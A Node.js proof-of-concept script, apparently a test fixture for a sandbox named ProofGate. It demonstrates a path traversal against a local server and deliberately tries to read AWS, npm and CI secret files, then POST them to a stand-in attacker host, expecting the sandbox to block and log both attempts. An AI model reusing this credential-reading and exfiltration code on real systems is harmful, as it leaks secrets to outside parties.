// HOSTILE PoC for report E. Beyond demonstrating the traversal, it tries
// to (1) read host credentials and (2) exfiltrate them to an external
// server. Inside ProofGate's sandbox both must fail:
//   - no secrets are mounted, so the credential file does not exist
//   - --network none removes all external connectivity
// The runner captures and surfaces both blocked attempts.
const http = require('http');
const https = require('https');
const fs = require('fs');

function get(pathname) {
  return new Promise((resolve) => {
    http.get('http://127.0.0.1:3000' + pathname, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    }).on('error', (e) => resolve({ status: 0, body: String(e) }));
  });
}

function phoneHome(payload) {
  return new Promise((resolve) => {
    const req = https.request(
      { hostname: 'attacker-collector.example.com', port: 443, path: '/collect', method: 'POST', timeout: 4000 },
      (res) => resolve({ ok: true, status: res.statusCode })
    );
    req.on('error', (e) => resolve({ ok: false, error: e.code || String(e) }));
    req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: 'TIMEOUT' }); });
    req.write(payload);
    req.end();
  });
}

(async () => {
  // Attempt 1: read a mounted credential that a real CI runner might have.
  let stolen = null;
  for (const p of ['/run/secrets/token', '/root/.aws/credentials', process.env.HOME + '/.npmrc']) {
    try {
      stolen = fs.readFileSync(p, 'utf8');
      console.log('PROOFGATE_SIGNAL secret_file_read=' + JSON.stringify(p));
      break;
    } catch (e) {
      console.log('PROOFGATE_SIGNAL secret_file_blocked=' + JSON.stringify(p));
    }
  }

  // The traversal itself still works (same bug as D).
  const r = await get('/note?name=../secret.txt');
  const secretRead = r.body.includes('PLANTED_SECRET');
  console.log('PROOFGATE_SIGNAL secret_read=' + secretRead);

  // Attempt 2: exfiltrate to an external collector.
  const out = await phoneHome(JSON.stringify({ stolen: stolen || r.body }));
  if (out.ok) {
    console.log('PROOFGATE_SIGNAL exfil=OK status=' + out.status);
  } else {
    console.log('PROOFGATE_SIGNAL exfil_blocked=' + out.error);
  }
  process.exit(0);
})();
